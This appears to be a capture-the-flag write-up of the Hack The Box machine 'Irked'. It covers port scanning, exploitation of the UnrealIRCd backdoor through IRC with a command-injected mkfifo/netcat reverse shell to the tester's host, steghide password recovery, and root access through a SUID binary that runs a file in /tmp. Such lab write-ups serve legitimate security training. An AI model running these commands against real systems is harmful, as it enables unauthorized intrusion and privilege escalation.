## Intro


Tags: #linux #OSCPpath #IRC #LinPEAS #unknown-binary #easy 
 
-----
# Reconnaissance

Add machine to `/etc/hosts`
```shell
echo '10.129.26.189 irked.htb' | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n irked.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-22 11:14 -0400
Nmap scan report for irked.htb (10.129.26.189)
Host is up (0.070s latency).
Not shown: 64346 closed tcp ports (reset), 1182 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
59378/tcp open  unknown
65534/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80,111,6697,8067,59378,65534 -A irked.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-22 11:15 -0400
Nmap scan report for irked.htb (10.129.26.189)
Host is up (0.046s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34347/tcp6  status
|   100024  1          34649/udp   status
|   100024  1          44006/udp6  status
|_  100024  1          59378/tcp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
59378/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4, Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   47.70 ms 10.10.14.1
2   44.72 ms irked.htb (10.129.26.189)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds
```
hm i dont see every day `UnrealIRCd`
## webapp

![](MediaFiles/Pasted%20image%2020260622181721.png)

### IRC

```shell
└─$ nc 10.129.26.189 8067                                                                                                                                                         
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
ERROR :Closing Link: [10.10.14.148] (Ping timeout)
```

-----
# Foothold

let seearch for exploit for unrealircd
```shell
searchsploit unrealircd
```

lets test the found exploit, inside IRC
```shell
└─$ nc 10.129.26.189 8067                                                                                                                                                         
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB; ping -c 1 10.10.14.148
```
lets verify and check if the ping will be shown:
```shell
sudo tcpdump -ni tun0 icmp
```
it works!

Since it works, lets start our listener
```shell
nc -lvnp 5555
```
and similarly instead of ping use a rev shell via irc
```shell
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.148 5555 >/tmp/f
```
so
```shell
└─$  nc 10.129.26.189 8067                                                                                                                                                         
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.148 5555 >/tmp/f
```
## Shell as ircd
```shell
└─$ nc -lvnp 5555                                                                                                                                                                  
listening on [any] 5555 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.26.189] 44481
bash: cannot set terminal process group (639): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ whoami
whoami
ircd
ircd@irked:~/Unreal3.2$
```
cant cat user flag though, hmm
```shell
ircd@irked:/home/djmardov$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

### Filesystem enumeration
enumerating the filesystem further, i found hidden file
```shell
ircd@irked:/home/djmardov/Documents$ ls -la
ls -la
total 12
drwxr-xr-x  2 djmardov djmardov 4096 Sep  5  2022 .
drwxr-xr-x 18 djmardov djmardov 4096 Sep  5  2022 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
lrwxrwxrwx  1 root     root       23 Sep  5  2022 user.txt -> /home/djmardov/user.txt
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```
now lets go on the picture we downloaded from the start, and provide this as passphrase
```shell
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
```
### Hidden image data extraction
```shell
└─$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
wrote extracted data to "pass.txt".

└─$ cat pass.txt                            
Kab6h+m+bbp2J:HG
```
#### creds obtained
```
Kab6h+m+bbp2J:HG
```
lets login as djmardov and grab user flag

## Shell as djmardov
```shell
└─$ ssh djmardov@irked.htb
The authenticity of host 'irked.htb (10.129.26.189)' can't be established.
ED25519 key fingerprint is: SHA256:Ej828KWlDpyEOvOxHAspautgmarzw646NS31tX3puFg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'irked.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

djmardov@irked.htb's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
djmardov@irked:~$ cat user.txt 
a838b933ae26ffee82a1e608e5895ffd
djmardov@irked:~$ 
```

-----
# Privesc

## sudo -l

```shell
djmardov@irked:~$ sudo -l
-bash: sudo: command not found
```
## linpeas

from linpeas what stood out was the binaries below, and manually we would search for them like that:
### Enumerate Binaries with the `SUID` or `GUID` bits set

**SUID (Set User ID)** and **GUID (Set Group ID)** are special permission bits in Linux/Unix that allow programs to run with the privileges of the file's owner or group, rather than the user who executes them.

 SUID (Set User ID)
- When set, the program runs with the **owner's** privileges
- Shown as `s` in the owner execute position (e.g., `-rwsr-xr-x`)
- The `4000` in your find command checks for SUID

 GUID (Set Group ID)
- When set, the program runs with the **group's** privileges
- Shown as `s` in the group execute position (e.g., `-rwxr-sr-x`)
- The `-g=s` in your find command checks for GUID (though `-perm -g=s` is a bit unusual - typically it's `-perm -2000`)

```shell
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
```
**command is looking for SUID binaries** (the `-perm -4000` part), specifically:
- `-perm -g=s` checks for SGID
- `-perm -4000` checks for SUID
- `! -type l` excludes symbolic links
- `-maxdepth 6` limits directory depth
```shell
-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount
```
**All the binaries listed are SUID (`rws` in owner permissions)**, and they all have **root ownership** (`root root`). This means:

> **Any user who executes these programs temporarily gains root privileges for that program's execution**

### Custom binary
this one stands out for me as not systemic and strange  is `/usr/bin/viewuser` ,lets run it
```shell
djmardov@irked:/bin$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2026-06-22 11:13 (:0)
djmardov pts/0        2026-06-22 11:32 (10.10.14.148)
sh: 1: /tmp/listusers: not found
```
interesting, it looks for a file `/tmp/listusers`

## Exploitation

wrote su root in the listusers file at `/tmp` and run
```shell
echo "su root"> /tmp/listusers && chmod 777 listusers
/usr/bin/viewuser
```
got root shell and grabbed root flag
## Shell as root
```shell
djmardov@irked:/tmp$ echo "su root"> /tmp/listusers && chmod 777 listusers
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2026-06-22 11:13 (:0)
djmardov pts/0        2026-06-22 11:32 (10.10.14.148)
root@irked:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@irked:/tmp# whoami
root
root@irked:/tmp# cat /root/root.txt
23747147da1c9d453298c15e82b2bbef
```

---
# Summary



-----
# Sidenotes
